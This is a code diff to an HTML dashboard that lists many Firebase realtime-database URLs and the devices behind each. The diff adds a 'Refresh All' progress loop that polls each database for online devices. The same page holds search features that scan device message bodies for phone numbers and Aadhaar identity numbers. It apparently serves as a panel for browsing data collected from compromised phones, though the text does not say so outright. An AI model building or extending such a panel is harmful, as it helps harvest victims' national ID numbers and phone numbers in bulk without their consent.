@@ -122,7 +122,13 @@
   .phone-chip { background:rgba(94,114,235,.15); color:var(--accent); border-radius:4px; padding:2px 8px; font-size:12px; font-weight:600; }
   .hit-body { font-size:12px; color:var(--muted); line-height:1.5; word-break:break-word; }
 
-  /* ── Responsive ── */
+  /* ── Progress overlay (blocks clicks during refresh all) ── */
+  .progress-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,.65); z-index:500;
+                      align-items:center; justify-content:center; flex-direction:column; gap:14px; }
+  .progress-overlay.active { display:flex; }
+  .progress-bar-wrap { width:320px; background:var(--bg3); border-radius:8px; height:10px; overflow:hidden; }
+  .progress-bar-fill { height:100%; background:var(--accent); border-radius:8px; transition:width .3s; }
+  .progress-label { color:var(--text); font-size:14px; }
   @media (max-width: 600px) {
     header { flex-wrap: wrap; } .search-bar { margin-left: 0; width: 100%; }
     .search-bar input { flex: 1; }
@@ -135,7 +141,7 @@
   <span class="badge" id="total-badge">—</span>
   <div class="search-bar">
     <input type="text" id="search-input" placeholder="Search URL or host…">
-    <button class="btn btn-ghost" id="refresh-btn" onclick="loadUrls()">↻ Refresh</button>
+    <button class="btn btn-ghost" id="refresh-btn" onclick="refreshAll()">↻ Refresh All</button>
   </div>
 </header>
 
@@ -152,7 +158,10 @@
   <!-- ── Devices view ── -->
   <div id="view-devices">
     <div class="back-btn" onclick="showUrls()">← Back to all URLs</div>
-    <div class="url-detail-header" id="url-detail-header"></div>
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">
+      <div class="url-detail-header" id="url-detail-header" style="flex:1;margin:0"></div>
+      <button class="btn btn-ghost" onclick="openUrl(currentUrlId)" style="white-space:nowrap;flex-shrink:0">↻ Refresh</button>
+    </div>
     <div class="device-filters" id="device-filters"></div>
     <div class="device-table-wrap">
       <table id="device-table">
@@ -178,6 +187,15 @@
     </div>
   </div>
 </main>
+
+<!-- ── Progress overlay (refresh all) ── -->
+<div class="progress-overlay" id="progress-overlay">
+  <div class="progress-label" id="progress-label">Refreshing URLs...</div>
+  <div class="progress-bar-wrap">
+    <div class="progress-bar-fill" id="progress-bar-fill" style="width:0%"></div>
+  </div>
+  <div style="color:var(--muted);font-size:12px" id="progress-sub"></div>
+</div>
 
 <!-- ── SearchNo Modal ── -->
 <div class="modal-overlay" id="searchno-modal" onclick="if(event.target===this)closeSearchno()">
@@ -263,6 +281,42 @@ async function loadUrls() {
   allUrls = await res.json();
   renderUrls(allUrls);
   renderStats(allUrls);
+}
+
+// ── Refresh All: fetch live status for every URL one by one ───────────────────
+async function refreshAll() {
+  const overlay  = document.getElementById('progress-overlay');
+  const bar      = document.getElementById('progress-bar-fill');
+  const label    = document.getElementById('progress-label');
+  const sub      = document.getElementById('progress-sub');
+  const total    = allUrls.length || 1;
+
+  overlay.classList.add('active');
+  let done = 0;
+
+  for (const u of allUrls) {
+    label.textContent = `Refreshing ${done + 1} / ${total} — URL #${u.id}`;
+    sub.textContent   = u.url.replace('https://','').replace('-default-rtdb.firebaseio.com','');
+    bar.style.width   = `${Math.round(done / total * 100)}%`;
+    try {
+      const r = await fetch(`/api/url/${u.id}/live`);
+      const d = await r.json();
+      // Update allUrls entry with fresh online count
+      const idx = allUrls.findIndex(x => x.id === u.id);
+      if (idx >= 0 && d.total != null) {
+        allUrls[idx].online = d.online;
+      }
+    } catch {}
+    done++;
+  }
+
+  bar.style.width   = '100%';
+  label.textContent = `Done — ${total} URLs refreshed`;
+  sub.textContent   = '';
+  setTimeout(() => {
+    overlay.classList.remove('active');
+    loadUrls();  // reload full summary
+  }, 800);
 }
 
 function renderStats(urls) {
@@ -580,7 +634,6 @@ async function openSearchaadhar(evt, urlId, deviceId, brand) {
         <div class="hit-card">
           <div class="hit-phones">
             ${h.aadhars.map(a => `<span class="phone-chip" style="background:rgba(34,197,94,.12);color:var(--green)">${a}</span>`).join('')}
-            ${h.hasKeyword && !h.aadhars.length ? `<span class="phone-chip" style="background:rgba(245,158,11,.12);color:var(--yellow)">🔑 aadhaar keyword</span>` : ''}
           </div>
           <div class="hit-body">${esc(h.body.slice(0, 300))}${h.body.length > 300 ? '…' : ''}</div>
         </div>
